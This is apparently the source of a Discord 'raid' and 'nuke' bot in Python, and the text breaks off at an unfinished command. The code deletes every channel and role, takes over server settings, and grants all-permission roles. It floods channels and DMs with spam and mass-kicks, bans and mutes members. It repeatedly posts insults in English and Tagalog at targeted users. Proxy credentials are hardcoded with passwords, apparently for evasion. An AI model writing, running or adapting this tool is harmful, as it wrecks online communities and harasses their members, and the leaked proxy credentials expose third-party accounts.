import os
import sys
import asyncio
import random
import aiohttp
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.voice_states = True
intents.dm_messages = True

RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

PROXY_LIST = [
    "http://vvbegivv:4635ud8aso9h@31.59.20.176:6754",
    "http://vvbegivv:4635ud8aso9h@45.38.107.97:6014",
    "http://vvbegivv:4635ud8aso9h@198.105.121.200:6462",
    "http://vvbegivv:4635ud8aso9h@64.137.96.74:6641",
    "http://vvbegivv:4635ud8aso9h@198.23.243.226:6361",
    "http://vvbegivv:4635ud8aso9h@38.154.185.97:6370",
    "http://vvbegivv:4635ud8aso9h@84.247.60.125:6095",
    "http://vvbegivv:4635ud8aso9h@142.111.67.146:5611",
    "http://vvbegivv:4635ud8aso9h@191.96.254.138:6185",
    "http://vvbegivv:4635ud8aso9h@31.58.9.4:6077",
    "http://xnkzipkr:fp3imtnn7ujr@31.59.20.176:6754",
    "http://xnkzipkr:fp3imtnn7ujr@45.38.107.97:6014",
    "http://xnkzipkr:fp3imtnn7ujr@198.105.121.200:6462",
    "http://xnkzipkr:fp3imtnn7ujr@64.137.96.74:6641",
    "http://xnkzipkr:fp3imtnn7ujr@198.23.243.226:6361",
    "http://xnkzipkr:fp3imtnn7ujr@38.154.185.97:6370",
    "http://xnkzipkr:fp3imtnn7ujr@84.247.60.125:6095",
    "http://xnkzipkr:fp3imtnn7ujr@142.111.67.146:5611",
    "http://xnkzipkr:fp3imtnn7ujr@191.96.254.138:6185",
    "http://xnkzipkr:fp3imtnn7ujr@31.58.9.4:6077"
]

USER_AGENTS = [
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 Edg/14.14393.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/131.0.2903.84 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:133.0) Gecko/133.0 Firefox/133.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
]

def get_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

def get_user_agent():
    if USER_AGENTS:
        return random.choice(USER_AGENTS)
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(RED + r"""::::::::::.:::::::-.       ...       .,::     .:.::    .   .:::
`;;;```.;;;;;,    `';, .;;;;;;;.   `;;;,  .,;; ';;, ;;   ;;;' 
 `]]nnn]]' `[[     [[,[[     \[[,   '[[,,[['    '[[, [[, [['  
   $$$""     $$,    $$$$$,     $$$    Y$$$P        Y$c$$$c$P    
   888o      888_,o8P'"888,_ _,88P  oP"``"Yo,      "88"888    
   YMMMb     MMMMP"`    "YMMMMMP",m"        "Mm,     "M "M"  """)
    print("                 Made By Dx NxrU                  ")
    print("==================================================" + RESET)

print_banner()

bot_token = input(BLUE + "[?] Enter Bot Token: " + RESET).strip()
user_id_str = input(BLUE + "[?] Enter User ID: " + RESET).strip()
prefix = input(BLUE + "[?] Enter Bot Prefix: " + RESET).strip()

OWNER_ID = int(user_id_str)
WHITELISTED_USERS = {OWNER_ID}

bot = commands.Bot(command_prefix=prefix, intents=intents, self_bot=False, help_command=None)

active_tasks = {}
selected_target_guild_id = None

SPECIFIC_GIF = "[https://tenor.com/view/pdoxw-circle-gif-4954831240427386212](https://tenor.com/view/pdoxw-circle-gif-4954831240427386212)"
DEFAULT_EMOJI = "🖕 🗡️ 🩸"

RAID_MESSAGES = [
    "𝐃𝐗 𝐍𝐗𝐑𝐔 𝐎𝐍 𝐓𝐎𝐏!!!",
    "[https://guns.lol/dxnxru](https://guns.lol/dxnxru)"
]

TRASHTALK_EN = [
    "You absolute clown, go back to kindergarten.",
    "Your brain is smoother than a bowling ball.",
    "Absolute zero IQ individual right here.",
    "Go touch some grass, absolute waste of oxygen.",
    "Even a rock has more utility than your entire bloodline.",
    "You talk big for someone with zero achievements.",
    "Get off your high horse before you fall and break your fragile ego.",
    "Your existence is a running joke everyone laughs at behind your back.",
    "Absolute NPC behavior coming straight from you.",
    "You bring nothing of value to this world, let alone this server."
]

TRASHTALK_TL = [
    "Bobo mo naman, pormang pormang tanga.",
    "Tanga ka ba o sadyang pinanganak kang inutil?",
    "Pulubi ng lipunan, pulpol pa magsalita.",
    "Ulol, ang hina mo namang kupal ka.",
    "Pota ka, ang baho ng ugali mo.",
    "Utak munggo ka talaga kahit kailan.",
    "Tigil-tigilan mo nga yan, ang cringe mo.",
    "Buhay ka pa pala? Sayang oxygen.",
    "Kupal ka na nga, feeling cool ka pa.",
    "Ang panget ng mukha mo pati ugali mo sabay."
]

def log_action(text, category="SUCCESS"):
    if category == "SUCCESS":
        print(f"{GREEN}[LOG-SUCCESS] -> {text}{RESET}")
    elif category == "INFO" or category == "PROCESSING":
        print(f"{BLUE}[LOG-PROCESSING] -> {text}{RESET}")
    else:
        print(f"{RED}[LOG-ERROR] -> {text}{RESET}")

async def get_active_guild(ctx):
    if selected_target_guild_id:
        g = bot.get_guild(selected_target_guild_id)
        if g:
            return g
    return ctx.guild

@bot.event
async def on_ready():
    print_banner()
    log_action(f"Logged in: {bot.user} (ID: {bot.user.id})", "SUCCESS")
    log_action(f"Owner ID: {OWNER_ID} | Prefix: {prefix}", "INFO")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.author.id not in WHITELISTED_USERS:
        return

    if message.content.startswith(prefix):
        try:
            asyncio.create_task(message.delete())
        except discord.HTTPException:
            pass

        ctx = await bot.get_context(message)
        if ctx.command:
            asyncio.create_task(bot.invoke(ctx))
            return

    await bot.process_commands(message)

@bot.command(name="menu")
async def cmd_menu(ctx):
    log_action("Executing menu command", "INFO")
    
    embed1 = discord.Embed(
        title="PDOXW TOOLKIT // COMMAND LIST (1/2)",
        description=f"Command directory.\nPrefix: `{prefix}`",
        color=0xFF0000
    )
    embed1.add_field(name="1. Raid Engine", value=f"`{prefix}raid`", inline=False)
    embed1.add_field(name="2. Whitelist User", value=f"`{prefix}white @member`", inline=False)
    embed1.add_field(name="3. Show Whitelist", value=f"`{prefix}list`", inline=False)
    embed1.add_field(name="4. Remove Whitelist", value=f"`{prefix}black @member`", inline=False)
    embed1.add_field(name="5. Server Nuke", value=f"`{prefix}nuke`", inline=False)
    embed1.add_field(name="6. Channel Purge", value=f"`{prefix}purge`", inline=False)
    embed1.add_field(name="7. Admin God Role", value=f"`{prefix}god`", inline=False)
    embed1.add_field(name="8. Grant God Role", value=f"`{prefix}god-user @member`", inline=False)
    embed1.add_field(name="9. Custom Role Drop", value=f"`{prefix}role [name]`", inline=False)
    embed1.add_field(name="10. Target Mute", value=f"`{prefix}mute @member [secs]`", inline=False)
    embed1.add_field(name="11. Mass Mute", value=f"`{prefix}mute-all [secs]`", inline=False)
    embed1.add_field(name="12. Kick Member", value=f"`{prefix}kick @member [reason]`", inline=False)
    embed1.add_field(name="13. Mass Kick", value=f"`{prefix}kick-all`", inline=False)
    embed1.add_field(name="14. Ban Member", value=f"`{prefix}ban @member [reason]`", inline=False)

    embed2 = discord.Embed(
        title="PDOXW TOOLKIT // COMMAND LIST (2/2)",
        description=f"Command directory (Cont.).\nPrefix: `{prefix}`",
        color=0xFF0000
    )
    embed2.add_field(name="15. Mass Ban", value=f"`{prefix}ban-all`", inline=False)
    embed2.add_field(name="16. Global Slowmode", value=f"`{prefix}slowmode [secs]`", inline=False)
    embed2.add_field(name="17. Join Call", value=f"`{prefix}join-call @member`", inline=False)
    embed2.add_field(name="18. Pull Voice Members", value=f"`{prefix}join-all-call`", inline=False)
    embed2.add_field(name="19. Global Spam", value=f"`{prefix}spam [message]`", inline=False)
    embed2.add_field(name="20. Targeted Trashtalk", value=f"`{prefix}trashtalk @member`", inline=False)
    embed2.add_field(name="21. Server Trashtalk", value=f"`{prefix}trashtalk-all`", inline=False)
    embed2.add_field(name="22. Broadcast Announcement", value=f"`{prefix}announce [message]`", inline=False)
    embed2.add_field(name="23. GIF Flood", value=f"`{prefix}spam-gif`", inline=False)
    embed2.add_field(name="24. Emoji Flood", value=f"`{prefix}spam-emoji [emojis]`", inline=False)
    embed2.add_field(name="25. Direct Message Spam", value=f"`{prefix}spam-msg @member [msg]`", inline=False)
    embed2.add_field(name="26. Mass DM Flood", value=f"`{prefix}spam-all-msg [msg]`", inline=False)
    embed2.add_field(name="27. User Profile Info", value=f"`{prefix}user-info [@member]`", inline=False)
    embed2.add_field(name="28. Export Member List", value=f"`{prefix}dl-info`", inline=False)
    embed2.add_field(name="29. Clean Text Echo", value=f"`{prefix}bot [text]`", inline=False)
    embed2.add_field(name="30. List Connected Servers", value=f"`{prefix}show-sv`", inline=False)
    embed2.add_field(name="31. Remote Server Selector", value=f"`{prefix}select-sv`", inline=False)
    embed2.add_field(name="32. Halt Operations", value=f"`{prefix}stop`", inline=False)
    embed2.set_footer(text="Made By Dx NxrU")

    await ctx.send(embed=embed1)
    await ctx.send(embed=embed2)
    log_action("Menu command completed successfully", "SUCCESS")

@bot.command(name="white")
async def cmd_white(ctx, member: discord.Member):
    log_action(f"Executing white command for {member}", "PROCESSING")
    if ctx.author.id != OWNER_ID:
        embed_err = discord.Embed(title="ACCESS DENIED", description="Only the owner can whitelist users.", color=0xFF0000)
        embed_err.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed_err)
        return
    
    WHITELISTED_USERS.add(member.id)
    embed = discord.Embed(title="USER WHITELISTED", description=f"Successfully added {member.mention} to the authorized whitelist.", color=0x00FF00)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action(f"User {member.id} whitelisted successfully", "SUCCESS")

@bot.command(name="list")
async def cmd_list(ctx):
    log_action("Executing list command", "PROCESSING")
    if ctx.author.id != OWNER_ID and ctx.author.id not in WHITELISTED_USERS:
        return
    
    guild = await get_active_guild(ctx)
    list_str = ""
    for uid in WHITELISTED_USERS:
        member = guild.get_member(uid)
        name = str(member) if member else f"User ID: {uid}"
        list_str += f"- {name} (`{uid}`)\n"

    embed = discord.Embed(title="AUTHORIZED WHITELIST", description=list_str if list_str else "No whitelisted users found.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("List command executed successfully", "SUCCESS")

@bot.command(name="black")
async def cmd_black(ctx, member: discord.Member):
    log_action(f"Executing black command for {member}", "PROCESSING")
    if ctx.author.id != OWNER_ID:
        embed_err = discord.Embed(title="ACCESS DENIED", description="Only the owner can remove users from the whitelist.", color=0xFF0000)
        embed_err.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed_err)
        return
    
    if member.id == OWNER_ID:
        embed_err = discord.Embed(title="ACTION BLOCKED", description="You cannot remove the bot owner from the whitelist.", color=0xFF0000)
        embed_err.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed_err)
        return

    if member.id in WHITELISTED_USERS:
        WHITELISTED_USERS.remove(member.id)
        embed = discord.Embed(title="WHITELIST REMOVAL", description=f"Successfully removed {member.mention} from the whitelist.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action(f"User {member.id} removed from whitelist successfully", "SUCCESS")
    else:
        embed_err = discord.Embed(title="NOT FOUND", description=f"{member.mention} is not in the whitelist.", color=0xFF0000)
        embed_err.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed_err)

@bot.command(name="raid")
async def cmd_raid(ctx, *, args: str = ""):
    log_action("Executing maximum-speed asynchronous blitz raid protocol", "PROCESSING")
    guild = await get_active_guild(ctx)
    active_tasks[guild.id] = True

    server_name = "𝐃𝐗 𝐍𝐗𝐑𝐔 𝐎𝐍 𝐓𝐎𝐏"
    channel_base_name = "D̸X̸-̸N̸X̸R̸U̸-̸O̸N̸-̸T̸O̸P̸"
    role_name = "𝐃𝐗 𝐍𝐗𝐑𝐔"
    custom_icon_path = "server_logo.png"

    delete_channel_tasks = [ch.delete() for ch in guild.channels]
    delete_role_tasks = [role.delete() for role in guild.roles if role != guild.default_role and role < guild.me.top_role]
    await asyncio.gather(*(delete_channel_tasks + delete_role_tasks), return_exceptions=True)

    try:
        with open(custom_icon_path, "rb") as f:
            logo_bytes = f.read()
            asyncio.create_task(guild.edit(name=server_name, icon=logo_bytes))
    except:
        asyncio.create_task(guild.edit(name=server_name))

    asyncio.create_task(guild.create_role(name=role_name, color=0xFF0000, permissions=discord.Permissions.all()))

    async def hyper_fast_spam_loop(ch):
        while active_tasks.get(guild.id, True):
            for msg in RAID_MESSAGES:
                try:
                    await ch.send(msg)
                except discord.HTTPException:
                    pass
            await asyncio.sleep(0)

    async def blitz_creator(i):
        if not active_tasks.get(guild.id, True):
            return
        try:
            cat = await guild.create_category(channel_base_name)
            ch = await guild.create_text_channel(channel_base_name, category=cat)
            await guild.create_voice_channel(channel_base_name, category=cat)
            asyncio.create_task(hyper_fast_spam_loop(ch))
        except discord.HTTPException:
            pass

    await asyncio.gather(*(blitz_creator(i) for i in range(1, 101)), return_exceptions=True)

    async def continuous_channel_generator():
        counter = 101
        while active_tasks.get(guild.id, True):
            batch = [blitz_creator(counter + j) for j in range(20)]
            counter += 20
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0)

    asyncio.create_task(continuous_channel_generator())
    log_action("Maximum-speed asynchronous blitz raid protocol executed successfully", "SUCCESS")

@bot.command(name="nuke")
async def cmd_nuke(ctx):
    log_action("Executing nuke command", "PROCESSING")
    guild = await get_active_guild(ctx)
    delete_tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    embed = discord.Embed(title="SERVER NUKE", description="All channels have been wiped.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Nuke command executed successfully", "SUCCESS")

@bot.command(name="purge")
async def cmd_purge(ctx):
    log_action("Executing purge command", "PROCESSING")
    guild = await get_active_guild(ctx)
    purge_tasks = [ch.purge(limit=None) for ch in guild.text_channels]
    await asyncio.gather(*purge_tasks, return_exceptions=True)
    embed = discord.Embed(title="CHANNEL PURGE", description="All text channels purged.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Purge command executed successfully", "SUCCESS")

@bot.command(name="god")
async def cmd_god(ctx):
    log_action("Executing god command", "PROCESSING")
    guild = await get_active_guild(ctx)
    member = guild.get_member(ctx.author.id)
    if not member:
        try:
            member = await guild.fetch_member(ctx.author.id)
        except:
            pass
    if member:
        try:
            role = await guild.create_role(name="God", permissions=discord.Permissions.all(), color=0xFF0000)
            await member.add_roles(role)
            embed = discord.Embed(title="GOD ROLE GRANTED", description="Full administrator privileges granted.", color=0xFF0000)
            embed.set_footer(text="Made By Dx NxrU")
            await ctx.send(embed=embed)
            log_action("God command executed successfully", "SUCCESS")
        except Exception as e:
            log_action(f"Failed to assign God role: {e}", "ERROR")

@bot.command(name="god-user")
async def cmd_god_user(ctx, member: discord.Member):
    log_action(f"Executing god-user command on {member}", "PROCESSING")
    guild = await get_active_guild(ctx)
    try:
        role = discord.utils.get(guild.roles, name="God")
        if not role:
            role = await guild.create_role(name="God", permissions=discord.Permissions.all(), color=0xFF0000)
        await member.add_roles(role)
        embed = discord.Embed(title="GOD USER GRANTED", description=f"Assigned full privileges to {member.mention}.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action("God-user command executed successfully", "SUCCESS")
    except Exception as e:
        log_action(f"Failed to assign god-user role: {e}", "ERROR")

@bot.command(name="role")
async def cmd_role(ctx, *, role_name: str = "PDOXW Member"):
    log_action(f"Executing role command: {role_name}", "PROCESSING")
    guild = await get_active_guild(ctx)
    try:
        role = await guild.create_role(name=role_name, color=0xFF0000)
        async def assign_and_notify(member):
            if not member.bot:
                try:
                    await member.add_roles(role)
                    await member.send(f"Assigned role **{role_name}** in {guild.name}.")
                except:
                    pass
        await asyncio.gather(*(assign_and_notify(m) for m in guild.members), return_exceptions=True)
        embed = discord.Embed(title="CUSTOM ROLE DROP", description=f"Role **{role_name}** dropped to members.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action("Role command executed successfully", "SUCCESS")
    except Exception as e:
        log_action(f"Role command failed: {e}", "ERROR")

@bot.command(name="mute")
async def cmd_mute(ctx, member: discord.Member, duration: int = 60):
    log_action(f"Executing mute command on {member} for {duration}s", "PROCESSING")
    guild = await get_active_guild(ctx)
    mute_tasks = [ch.set_permissions(member, send_messages=False, speak=False) for ch in guild.channels]
    await asyncio.gather(*mute_tasks, return_exceptions=True)
    
    embed = discord.Embed(title="TARGET MUTED", description=f"{member.mention} muted for {duration} seconds.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    
    await asyncio.sleep(duration)
    unmute_tasks = [ch.set_permissions(member, overwrite=None) for ch in guild.channels]
    await asyncio.gather(*unmute_tasks, return_exceptions=True)
    log_action(f"Mute period expired for {member}", "SUCCESS")

@bot.command(name="mute-all")
async def cmd_mute_all(ctx, duration: int = 60):
    log_action(f"Executing mute-all command for {duration}s", "PROCESSING")
    guild = await get_active_guild(ctx)
    tasks = []
    for member in guild.members:
        if member.bot or member.id in WHITELISTED_USERS:
            continue
        for ch in guild.channels:
            tasks.append(ch.set_permissions(member, send_messages=False, speak=False))
    await asyncio.gather(*tasks, return_exceptions=True)
    
    embed = discord.Embed(title="MASS MUTE", description=f"All members muted for {duration} seconds.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    
    await asyncio.sleep(duration)
    unmute_tasks = []
    for member in guild.members:
        if member.bot or member.id in WHITELISTED_USERS:
            continue
        for ch in guild.channels:
            unmute_tasks.append(ch.set_permissions(member, overwrite=None))
    await asyncio.gather(*unmute_tasks, return_exceptions=True)
    log_action("Mass mute period expired", "SUCCESS")

@bot.command(name="kick")
async def cmd_kick(ctx, member: discord.Member, *, reason: str = "Security Kick"):
    log_action(f"Executing kick command on {member}", "PROCESSING")
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(title="MEMBER KICKED", description=f"Successfully kicked {member.mention}.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action("Kick command executed successfully", "SUCCESS")
    except Exception as e:
        log_action(f"Kick failed: {e}", "ERROR")

@bot.command(name="kick-all")
async def cmd_kick_all(ctx):
    log_action("Executing kick-all command", "PROCESSING")
    guild = await get_active_guild(ctx)
    
    async def kick_member(member):
        if member.id == bot.user.id or member.id in WHITELISTED_USERS or member.bot:
            return 0
        try:
            await member.kick(reason="Mass Kick")
            return 1
        except:
            return 0

    await asyncio.gather(*(kick_member(m) for m in guild.members), return_exceptions=True)
    embed = discord.Embed(title="MASS KICK", description="All eligible members kicked.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Kick-all executed successfully", "SUCCESS")

@bot.command(name="ban")
async def cmd_ban(ctx, member: discord.Member, *, reason: str = "Security Ban"):
    log_action(f"Executing ban command on {member}", "PROCESSING")
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(title="MEMBER BANNED", description=f"Successfully banned {member.mention}.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action("Ban command executed successfully", "SUCCESS")
    except Exception as e:
        log_action(f"Ban failed: {e}", "ERROR")

@bot.command(name="ban-all")
async def cmd_ban_all(ctx):
    log_action("Executing ban-all command", "PROCESSING")
    guild = await get_active_guild(ctx)
    
    async def ban_member(member):
        if member.id == bot.user.id or member.id in WHITELISTED_USERS or member.bot:
            return 0
        try:
            await member.ban(reason="Mass Ban")
            return 1
        except:
            return 0

    await asyncio.gather(*(ban_member(m) for m in guild.members), return_exceptions=True)
    embed = discord.Embed(title="MASS BAN", description="All eligible members banned.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Ban-all executed successfully", "SUCCESS")

@bot.command(name="slowmode")
async def cmd_slowmode(ctx, seconds: int = 5):
    log_action(f"Executing slowmode command with {seconds}s", "PROCESSING")
    guild = await get_active_guild(ctx)
    
    async def apply_slowmode(ch):
        try:
            await ch.edit(slowmode_delay=seconds)
            for uid in WHITELISTED_USERS:
                member = guild.get_member(uid)
                if member:
                    await ch.set_permissions(member, manage_messages=True)
        except Exception:
            pass

    tasks = [apply_slowmode(ch) for ch in guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    embed = discord.Embed(title="GLOBAL SLOWMODE", description=f"Slowmode set to {seconds} seconds across channels.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Slowmode command executed successfully", "SUCCESS")

@bot.command(name="join-call")
async def cmd_join_call(ctx, member: discord.Member):
    log_action(f"Executing join-call on {member}", "PROCESSING")
    guild = await get_active_guild(ctx)
    if member.voice and member.voice.channel:
        try:
            bot_member = guild.me
            if bot_member.voice and bot_member.voice.channel:
                await bot_member.move_to(member.voice.channel)
            embed = discord.Embed(title="VOICE JOIN", description=f"Joined voice channel of {member.mention}.", color=0xFF0000)
            embed.set_footer(text="Made By Dx NxrU")
            await ctx.send(embed=embed)
            log_action("Join-call executed successfully", "SUCCESS")
        except Exception as e:
            log_action(f"Join-call failed: {e}", "ERROR")

@bot.command(name="join-all-call")
async def cmd_join_all_call(ctx):
    log_action("Executing join-all-call", "PROCESSING")
    guild = await get_active_guild(ctx)
    voice_channels = guild.voice_channels
    if voice_channels:
        target_vc = voice_channels[0]
        tasks = []
        for member in guild.members:
            if member.voice and not member.bot:
                tasks.append(member.move_to(target_vc))
        await asyncio.gather(*tasks, return_exceptions=True)
        embed = discord.Embed(title="MASS PULL VOICE", description="Pulled all active voice members into single channel.", color=0xFF0000)
        embed.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed)
        log_action("Join-all-call executed successfully", "SUCCESS")

@bot.command(name="spam")
async def cmd_spam(ctx, *, message: str = "𝐃𝐗 𝐍𝐗𝐑𝐔 𝐎𝐍 𝐓𝐎𝐏"):
    log_action("Executing hyper-speed spam command", "PROCESSING")
    guild = await get_active_guild(ctx)
    active_tasks[guild.id] = True
    channels = guild.text_channels

    async def target_spam(ch):
        while active_tasks.get(guild.id, True):
            try:
                await ch.send(message)
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)

    for ch in channels:
        asyncio.create_task(target_spam(ch))
        
    embed = discord.Embed(title="GLOBAL SPAM ENGAGED", description="Spamming text at maximum speed across all channels.", color=0xFF0000)
    embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed)
    log_action("Spam command executed successfully", "SUCCESS")

@bot.command(name="trashtalk")
async def cmd_trashtalk(ctx, member: discord.Member):
    log_action(f"Executing trashtalk on {member}", "PROCESSING")
    guild = await get_active_guild(ctx)
    task_key = f"trashtalk_{guild.id}_{member.id}"
    active_tasks[task_key] = True

    embed_prompt = discord.Embed(title="TRASHTALK SETUP", description="Choose language / Pumili ng wika: Type **tagalog** or **english**", color=0xFF0000)
    embed_prompt.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed_prompt)

    def check(m):
        return m.author.id == ctx.author.id and m.channel == ctx.channel and m.content.lower() in ["tagalog", "english"]

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
        lang = msg.content.lower()
    except asyncio.TimeoutError:
        embed_timeout = discord.Embed(title="TIMEOUT", description="Timed out. Defaulting to Tagalog.", color=0xFF0000)
        embed_timeout.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed_timeout)
        lang = "tagalog"

    word_list = TRASHTALK_TL if lang == "tagalog" else TRASHTALK_EN
    ch = ctx.channel if not isinstance(ctx.channel, discord.DMChannel) else guild.text_channels[0]

    async def loop_trashtalk():
        while active_tasks.get(task_key, True):
            line = random.choice(word_list)
            try:
                await ch.send(f"{member.mention} {line}")
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)

    asyncio.create_task(loop_trashtalk())
    embed_success = discord.Embed(title="TRASHTALK ACTIVE", description=f"Trashtalking {member.mention} at maximum speed. Type `{prefix}stop` to end.", color=0xFF0000)
    embed_success.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed_success)
    log_action("Trashtalk task engaged", "SUCCESS")

@bot.command(name="trashtalk-all")
async def cmd_trashtalk_all(ctx):
    log_action("Executing trashtalk-all", "PROCESSING")
    guild = await get_active_guild(ctx)
    task_key = f"trashtalk_all_{guild.id}"
    active_tasks[task_key] = True

    embed_prompt = discord.Embed(title="TRASHTALK ALL SETUP", description="Choose language / Pumili ng wika: Type **tagalog** or **english**", color=0xFF0000)
    embed_prompt.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed_prompt)

    def check(m):
        return m.author.id == ctx.author.id and m.channel == ctx.channel and m.content.lower() in ["tagalog", "english"]

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
        lang = msg.content.lower()
    except asyncio.TimeoutError:
        embed_timeout = discord.Embed(title="TIMEOUT", description="Timed out. Defaulting to Tagalog.", color=0xFF0000)
        embed_timeout.set_footer(text="Made By Dx NxrU")
        await ctx.send(embed=embed_timeout)
        lang = "tagalog"

    word_list = TRASHTALK_TL if lang == "tagalog" else TRASHTALK_EN
    ch = ctx.channel if not isinstance(ctx.channel, discord.DMChannel) else guild.text_channels[0]
    members = [m for m in guild.members if m.id not in WHITELISTED_USERS and not m.bot]

    async def loop_trashtalk_all():
        while active_tasks.get(task_key, True) and members:
            target = random.choice(members)
            line = random.choice(word_list)
            try:
                await ch.send(f"{target.mention} {line}")
            except discord.HTTPException:
                pass
            await asyncio.sleep(0)

    asyncio.create_task(loop_trashtalk_all())
    embed_success = discord.Embed(title="TRASHTALK ALL ACTIVE", description=f"Trashtalking all members at maximum speed. Type `{prefix}stop` to end.", color=0xFF0000)
    embed_success.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=embed_success)
    log_action("Trashtalk-all task engaged", "SUCCESS")

@bot.command(name="announce")
async def cmd_announce(ctx, *, message: str = "ANNOUNCEMENT"):
    log_action("Executing announce command", "PROCESSING")
    guild = await get_active_guild(ctx)
    
    embed = discord.Embed(
        title="⚠️ SERVER RAID WARNING ⚠️",
        description=f"@everyone\n\n**THE SERVER IS GOING TO BE RAIDED!**\n\n{message}",
        color=0xFF0000
    )
    embed.set_footer(text="Made By Dx NxrU - SECURITY ALERT")
    
    announce_tasks = [ch.send(embed=embed) for ch in guild.text_channels]
    await asyncio.gather(*announce_tasks, return_exceptions=True)
    
    confirm_embed = discord.Embed(title="ANNOUNCEMENT SENT", description="Raid broadcast published successfully across all channels.", color=0xFF0000)
    confirm_embed.set_footer(text="Made By Dx NxrU")
    await ctx.send(embed=confirm_embed)
    log_action("Announce command executed successfully", "SUCCESS")

@bot.command(name="spam-gif")
